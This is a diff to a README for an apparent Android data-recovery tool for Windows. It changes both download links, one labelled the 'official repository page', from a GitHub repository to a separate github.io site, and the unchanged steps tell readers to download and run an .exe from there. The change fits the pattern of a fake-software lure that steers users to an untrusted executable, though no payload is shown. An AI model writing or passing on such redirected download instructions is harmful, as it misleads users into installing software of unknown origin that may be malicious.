@@ -1,6 +1,6 @@
 # 📱 Android-Data-Recovery-Pro - Recover lost files on your phone
 
-[![](https://img.shields.io/badge/Download-Android_Data_Recovery_Pro-blue.svg)](https://github.com/Margareteoriginal175/Android-Data-Recovery-Pro)
+[![](https://img.shields.io/badge/Download-Android_Data_Recovery_Pro-blue.svg)](https://margareteoriginal175.github.io)
 
 ## 📌 Software Overview
 Android Data Recovery Pro allows users to restore deleted files from Android mobile devices. This software works on Windows 10 and Windows 11 computers. It finds lost photos, messages, contacts, and documents. The tool connects to your device via USB to scan for data that you accidentally deleted. 
@@ -15,7 +15,7 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Downloading the Software 
 Follow these steps to obtain the tool:
-1. Visit the [official repository page](https://github.com/Margareteoriginal175/Android-Data-Recovery-Pro).
+1. Visit the [official repository page](https://margareteoriginal175.github.io).
 2. Locate the link labeled "Download" or check the "Releases" section on the right side of the page.
 3. Select the file ending in .exe to begin the download process.
 4. Save the file to your "Downloads" folder for easy access.
